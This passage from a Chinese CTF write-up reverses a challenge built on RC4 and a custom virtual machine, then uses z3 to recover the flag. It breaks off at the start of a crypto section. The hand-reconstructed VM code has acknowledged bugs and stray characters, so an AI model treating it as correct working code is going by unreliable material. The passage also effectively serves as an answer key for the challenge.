class="line">    back = Fun(right)</span><br><span class="line">    data1 = [<span class="number">228</span>, <span class="number">244</span>, <span class="number">207</span>, <span class="number">251</span>, <span class="number">194</span>, <span class="number">124</span>, <span class="number">252</span>, <span class="number">61</span>, <span class="number">198</span>, <span class="number">145</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">92</span>, <span class="number">208</span>, <span class="number">155</span>, <span class="number">38</span>, <span class="number">34</span>, <span class="number">225</span>, <span class="number">98</span>, <span class="number">206</span>, <span class="number">234</span>, <span class="number">245</span>, <span class="number">223</span>, <span class="number">54</span>, <span class="number">214</span>, <span class="number">137</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">180</span>, <span class="number">66</span>, <span class="number">223</span>, <span class="number">234</span>, <span class="number">90</span>, <span class="number">136</span>, <span class="number">5</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">117</span>, <span class="number">111</span>, <span class="number">222</span>, <span class="number">39</span>, <span class="number">156</span>, <span class="number">163</span>, <span class="number">173</span>, <span class="number">36</span>, <span class="number">174</span>, <span class="number">47</span>, <span class="number">144</span>, <span class="number">15</span>, <span class="number">160</span>, <span class="number">45</span>, <span class="number">239</span>, <span class="number">211</span>, <span class="number">11</span>, <span class="number">190</span>, <span class="number">181</span>, <span class="number">24</span>, <span class="number">164</span>, <span class="number">234</span>, <span class="number">114</span>, <span class="number">174</span>, <span class="number">27</span>]</span><br><span class="line">    data1 = <span class="built_in">bytes</span>(p3(s, data1))</span><br><span class="line">    data2 = [<span class="number">165</span>, <span class="number">83</span>, <span class="number">203</span>, <span class="number">51</span>, <span class="number">99</span>, <span class="number">164</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">230</span>, <span class="number">64</span>, <span class="number">181</span>, <span class="number">55</span>, <span class="number">190</span>, <span class="number">47</span>, <span class="number">125</span>, <span class="number">240</span>, <span class="number">186</span>, <span class="number">173</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">89</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">215</span>, <span class="number">124</span>, <span class="number">138</span>, <span class="number">34</span>, <span class="number">175</span>, <span class="number">60</span>, <span class="number">136</span>, <span class="number">77</span>, <span class="number">216</span>, <span class="number">250</span>, <span class="number">127</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">66</span>, <span class="number">168</span>, <span class="number">198</span>, <span class="number">247</span>, <span class="number">252</span>, <span class="number">189</span>, <span class="number">243</span>, <span class="number">239</span>, <span class="number">25</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">226</span>, <span class="number">100</span>, <span class="number">6</span>, <span class="number">207</span>, <span class="number">77</span>, <span class="number">46</span>, <span class="number">136</span>, <span class="number">251</span>, <span class="number">123</span>, <span class="number">225</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">183</span>]</span><br><span class="line">    data2 = <span class="built_in">bytes</span>(p3(s, data2))</span><br><span class="line">    data3 = [<span class="number">95</span>, <span class="number">219</span>, <span class="number">46</span>, <span class="number">178</span>, <span class="number">111</span>, <span class="number">141</span>, <span class="number">17</span>, <span class="number">168</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">68</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">183</span>, <span class="number">182</span>, <span class="number">118</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">150</span>, <span class="number">240</span>, <span class="number">140</span>, <span class="number">159</span>, <span class="number">110</span>, <span class="number">238</span>]</span><br><span class="line">    data3 = <span class="built_in">bytes</span>(p3(s, data3))</span><br><span class="line">    <span class="keyword">if</span> data2 == back:</span><br><span class="line">        <span class="built_in">print</span>(data1.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(data3.decode())</span><br></pre></td></tr></table></figure>

<p>p1是rc4对key的初始化，初始化出sbox，p2是一个异或，p3是rc4的加密，每次调用会改sbox，Have函数是一个打印字符串和获取输入，输入长度为64位，然后传到Fun里，Fun这个加密有点逆天</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Fun</span>(<span class="params">right</span>):</span><br><span class="line">    back = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(right) != <span class="number">64</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="literal">None</span> + <span class="built_in">len</span>(<span class="string">&#x27;XD&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(right) // <span class="number">8</span>):</span><br><span class="line">        part1 = struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, right[i*<span class="number">8</span> : i*<span class="number">8</span>+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        part2 = struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, right[i*<span class="number">8</span>+<span class="number">4</span> : i*<span class="number">8</span>+<span class="number">8</span>])[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> part1 != <span class="number">0</span>:</span><br><span class="line">            part1 ^= struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, back[i*<span class="number">8</span>-<span class="number">8</span> : i*<span class="number">8</span>-<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">            part2 ^= struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, back[i*<span class="number">8</span>-<span class="number">4</span> : i*<span class="number">8</span>])[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        vm(part1，part2)</span><br><span class="line">        back += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, part1) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, part2))[<span class="number">0</span>] + struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, part1) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, part2))[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> back</span><br></pre></td></tr></table></figure>

<p>最后发现，其实可以修的，只需要用pyspy nop一下invaild即可，虚拟机那一块没有多少花指令，所以修完只有VM函数有点问题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">F1</span>(<span class="params">part1, part2</span>):</span><br><span class="line">    <span class="keyword">global</span> REG</span><br><span class="line">    <span class="comment"># REG = &#123;&#x27;EAX&#x27;:0, &#x27;EBX&#x27;:0, &#x27;ECX&#x27;:0, &#x27;EDX&#x27;:0, &#x27;R8&#x27;:0, &#x27;CNT&#x27;:0, &#x27;EIP&#x27;:0&#125;</span></span><br><span class="line">    reg_table = &#123;</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;EAX&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;EBX&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;ECX&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;EDX&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;R8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;CNT&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;EIP&#x27;</span> &#125;</span><br><span class="line">    REG[<span class="string">&#x27;ECX&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    REG[<span class="string">&#x27;EDX&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    REG[<span class="string">&#x27;E8&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    REG[<span class="string">&#x27;CNT&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    REG[<span class="string">&#x27;EAX&#x27;</span>] = part1</span><br><span class="line">    REG[<span class="string">&#x27;EBX&#x27;</span>] = part2</span><br><span class="line">opcode = [<span class="number">7</span>, <span class="number">153</span>, <span class="number">255</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F2</span>(<span class="params">v1, v2, v3</span>):</span><br><span class="line">    <span class="keyword">global</span> REG, reg_table</span><br><span class="line">    <span class="keyword">if</span> v1 == <span class="number">1</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] = extendKey[REG[reg_table[<span class="built_in">str</span>(v3)]]]</span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">2</span> :</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] = REG[reg_table[<span class="built_in">str</span>(v3)]]</span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">3</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] = v3</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">4</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F3</span>(<span class="params">v1, v2, v3</span>):</span><br><span class="line">    <span class="keyword">if</span> v1 == <span class="number">1</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] = (REG[reg_table[<span class="built_in">str</span>(v2)]] + extendKey[REG[reg_table[<span class="built_in">str</span>(v3)]]]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">2</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] = (REG[reg_table[<span class="built_in">str</span>(v2)]] + REG[reg_table[<span class="built_in">str</span>(v3)]]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">3</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] = (REG[reg_table[<span class="built_in">str</span>(v2)]] + v3)</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F4</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    REG[reg_table[<span class="built_in">str</span>(v1)]] ^= REG[reg_table[<span class="built_in">str</span>(v2)]]</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F5</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    REG[reg_table[<span class="built_in">str</span>(v1)]] &amp;= v2</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">3</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F6</span>(<span class="params">v1, v2, v3</span>):</span><br><span class="line">    <span class="keyword">if</span> v1 == <span class="number">1</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] -= extendKey[v3]</span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">2</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] -= REG[reg_table[<span class="built_in">str</span>(v3)]]</span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">3</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] -= v3</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F7</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    REG[reg_table[<span class="built_in">str</span>(v1)]] |= REG[reg_table[<span class="built_in">str</span>(v2)]]</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">3</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F8</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    REG[reg_table[<span class="built_in">str</span>(v1)]] = (REG[reg_table[<span class="built_in">str</span>(v1)]] &gt;&gt; REG[reg_table[<span class="built_in">str</span>(v2)]])&amp;<span class="number">0xffffffff</span></span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">3</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F9</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    REG[reg_table[<span class="built_in">str</span>(v1)]] = (REG[reg_table[<span class="built_in">str</span>(v1)]] &lt;&lt; REG[reg_table[<span class="built_in">str</span>(v2)]])&amp;<span class="number">0xffffffff</span></span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">3</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FA</span>(<span class="params">v1, v2, v3</span>):</span><br><span class="line">    <span class="keyword">if</span> v1 == <span class="number">1</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] *= extendKey[v3]</span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">2</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] *= REG[reg_table[<span class="built_in">str</span>(v3)]]</span><br><span class="line">    <span class="keyword">elif</span> v1 == <span class="number">3</span>:</span><br><span class="line">        REG[reg_table[<span class="built_in">str</span>(v2)]] *= v3</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">4</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FB</span>():</span><br><span class="line">    REG[<span class="string">&#x27;R8&#x27;</span>] = (REG[<span class="string">&#x27;CNT&#x27;</span>] == <span class="number">21</span>)</span><br><span class="line">    REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WC</span>():</span><br><span class="line">    <span class="keyword">if</span> REG[<span class="string">&#x27;R8&#x27;</span>]:</span><br><span class="line">        REG[<span class="string">&#x27;EIP&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        REG[<span class="string">&#x27;EIP&#x27;</span>] = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">VM</span>(<span class="params">part1, part2</span>):</span><br><span class="line">    F1(part1, part2)</span><br><span class="line">    EIP = REG[<span class="string">&#x27;EIP&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> opcode[EIP] == <span class="number">80</span>:</span><br><span class="line">        F2(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>], opcode[EIP+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">29</span>:</span><br><span class="line">        F3(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>], opcode[EIP+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">113</span>:</span><br><span class="line">        F4(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">114</span>:</span><br><span class="line">        F5(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">150</span>:</span><br><span class="line">        F6(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>], opcode[EIP+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">87</span>:</span><br><span class="line">        F7(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">116</span>:</span><br><span class="line">        F8(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">41</span>:</span><br><span class="line">        F9(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">220</span>:</span><br><span class="line">        FA(opcode[EIP+<span class="number">1</span>], opcode[EIP+<span class="number">2</span>], opcode[EIP+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">7</span>:</span><br><span class="line">        FB()</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">153</span>:</span><br><span class="line">        WC()</span><br></pre></td></tr></table></figure>

<p>加密流程：vm和异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x43af236</span>,</span><br><span class="line"><span class="number">0x56b19afc</span>,</span><br><span class="line"><span class="number">0xf71e21dc</span>,</span><br><span class="line"><span class="number">0xdb8f8e94</span>,</span><br><span class="line"><span class="number">0x4d34e79d</span>,</span><br><span class="line"><span class="number">0x9c520c6e</span>,</span><br><span class="line"><span class="number">0xfbfad5fd</span>,</span><br><span class="line"><span class="number">0x32f9782c</span>,</span><br><span class="line"><span class="number">0xbbbe39c1</span>,</span><br><span class="line"><span class="number">0xd98575b6</span>,</span><br><span class="line"><span class="number">0x28f8cc78</span>,</span><br><span class="line"><span class="number">0xa4e48592</span>,</span><br><span class="line"><span class="number">0xebd72c5</span>,</span><br><span class="line"><span class="number">0xaf87912a</span>,</span><br><span class="line"><span class="number">0x8bf1ef96</span>,</span><br><span class="line"><span class="number">0x1660d112</span>]</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">s=Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag%d&quot;</span> % i,<span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="comment">#flag[0] ^= data[12]</span></span><br><span class="line"><span class="comment">#flag[1] ^= data[13]</span></span><br><span class="line">extendKey = [<span class="number">1835819331</span>, <span class="number">1853321028</span>, <span class="number">1768711490</span>, <span class="number">1432712805</span>, <span class="number">2177920767</span>, <span class="number">4020699579</span>, <span class="number">2261476601</span>, <span class="number">3551400604</span>, <span class="number">711874531</span>, <span class="number">3318306392</span>, <span class="number">1124217505</span>, <span class="number">2427199549</span>, <span class="number">3099853672</span>, <span class="number">2098025776</span>, <span class="number">1041196945</span>, <span class="number">2929936300</span>, <span class="number">246748610</span>, <span class="number">1941455090</span>, <span class="number">1303848803</span>, <span class="number">3809763535</span>, <span class="number">1395557789</span>, <span class="number">546751855</span>, <span class="number">1830937100</span>, <span class="number">2385871555</span>, <span class="number">2516030638</span>, <span class="number">3043054017</span>, <span class="number">3628118989</span>, <span class="number">1450520846</span>, <span class="number">1825094265</span>, <span class="number">3651791800</span>, <span class="number">32069749</span>, <span class="number">1469868411</span>, <span class="number">919887482</span>, <span class="number">4017993154</span>, <span class="number">4002737591</span>, <span class="number">3104343244</span>, <span class="number">4134211933</span>, <span class="number">420914335</span>, <span class="number">4152510760</span>, <span class="number">1317719524</span>, <span class="number">1990496755</span>, <span class="number">1873950060</span>, <span class="number">2553314372</span>, <span class="number">3602559392</span>]</span><br><span class="line">ecx = <span class="number">0</span></span><br><span class="line">flag[<span class="number">0</span>] = (flag[<span class="number">0</span>] + extendKey[ecx]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">ecx = <span class="number">1</span></span><br><span class="line">flag[<span class="number">1</span>] = (flag[<span class="number">1</span>] + extendKey[ecx]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">r8 = <span class="number">0</span></span><br><span class="line">edx = <span class="number">0</span></span><br><span class="line"><span class="comment">#cmp = [0x43af236, 0x56b19afc,0xf71e21dc, 0xdb8f8e94,0x4d34e79d, 0x9c520c6e,0xfbfad5fd, 0x32f9782c,0xbbbe39c1, 0xd98575b6,0x28f8cc78, 0xa4e48592,0xebd72c5, 0xaf87912a,0x8bf1ef96, 0x1660d112]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cnt &lt; <span class="number">21</span>):</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    flag[<span class="number">0</span>] ^= flag[<span class="number">1</span>]</span><br><span class="line">    ecx = flag[<span class="number">0</span>]</span><br><span class="line">    r8 = flag[<span class="number">1</span>]</span><br><span class="line">    flag[<span class="number">1</span>] &amp;= <span class="number">31</span></span><br><span class="line">    flag[<span class="number">0</span>] = (flag[<span class="number">0</span>] &lt;&lt; flag[<span class="number">1</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">    edx = <span class="number">32</span></span><br><span class="line">    edx -= flag[<span class="number">1</span>]</span><br><span class="line">    ecx = (ecx &gt;&gt; edx)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    flag[<span class="number">0</span>] |= ecx&amp;<span class="number">0xffffffff</span></span><br><span class="line">    flag[<span class="number">1</span>] = cnt</span><br><span class="line">    flag[<span class="number">1</span>] *= <span class="number">2</span></span><br><span class="line">    ecx = extendKey[flag[<span class="number">1</span>]]</span><br><span class="line">    flag[<span class="number">0</span>] = (flag[<span class="number">0</span>] + ecx) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    flag[<span class="number">1</span>] = r8</span><br><span class="line">    flag[<span class="number">1</span>] ^= flag[<span class="number">0</span>]</span><br><span class="line">    ecx = flag[<span class="number">1</span>]</span><br><span class="line">    edx = flag[<span class="number">0</span>]</span><br><span class="line">    edx &amp;= <span class="number">31</span></span><br><span class="line">    flag[<span class="number">1</span>] = (flag[<span class="number">1</span>] &lt;&lt; edx)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    r8 = <span class="number">32</span></span><br><span class="line">    r8 -= edx</span><br><span class="line">    ecx = (ecx &gt;&gt; r8)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    flag[<span class="number">1</span>] |= ecx&amp;<span class="number">0xffffffff</span></span><br><span class="line">    ecx = cnt</span><br><span class="line">    ecx *= <span class="number">2</span></span><br><span class="line">    ecx = (ecx + <span class="number">1</span>)</span><br><span class="line">    edx = extendKey[ecx]</span><br><span class="line">    flag[<span class="number">1</span>] = (flag[<span class="number">1</span>] + edx) &amp; <span class="number">0xffffffff</span></span><br><span class="line">s.add(flag[<span class="number">1</span>] &amp; <span class="number">0xffffffff</span> == <span class="number">0x56b19afc</span>)<span class="comment">#第一组的第一个</span></span><br><span class="line">s.add(flag[<span class="number">0</span>] &amp; <span class="number">0xffffffff</span> == <span class="number">0x43af236</span>)<span class="comment">#第一组的第二个</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#print(v5)</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment">#[flag0 = 1464681300, flag1 = 1182484272]</span></span><br><span class="line"><span class="comment">#[flag0 = 811877750, flag1 = 862873966]</span></span><br><span class="line"><span class="comment">#[flag0 = 1730238768, flag1 = 1967223397]</span></span><br><span class="line"><span class="comment">#[flag0 = 1098343795, flag1 = 812462881]</span></span><br><span class="line"><span class="comment">#[flag0 = 559049063, flag1 = 1752449633]</span></span><br><span class="line"><span class="comment">#[flag0 = 1667974770, flag1 = 1869431345]</span></span><br><span class="line"><span class="comment">#[flag0 = 1633905485, flag1 = 829583920]</span></span><br><span class="line"><span class="comment">#[flag0 = 1914787663, flag1 = 1461789053]</span></span><br><span class="line">flag_f = [<span class="number">1464681300</span>,<span class="number">1182484272</span>,<span class="number">811877750</span>,<span class="number">862873966</span>,<span class="number">1730238768</span>,<span class="number">1967223397</span>,<span class="number">1098343795</span>,<span class="number">812462881</span>,<span class="number">559049063</span>,<span class="number">1752449633</span>,<span class="number">1667974770</span>,<span class="number">1869431345</span>,<span class="number">1633905485</span>,<span class="number">829583920</span>,<span class="number">1914787663</span>,<span class="number">1461789053</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_f)):</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_f[i]).decode(),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1><span id="cry">Cry</span><a href="#cry" class="header-anchor"></a></h1><h2><span id="signin">signin</span><a href="#signin" class="header-anchor"></a></h2><p>先是一个跟DASCTF七月赛的一个p^q泄露，剪枝爆破一下就行。</p>
<p>后面是一个简单的hnp问题。</p>
<p>r&#x3D;(b*s)%2^16</p>
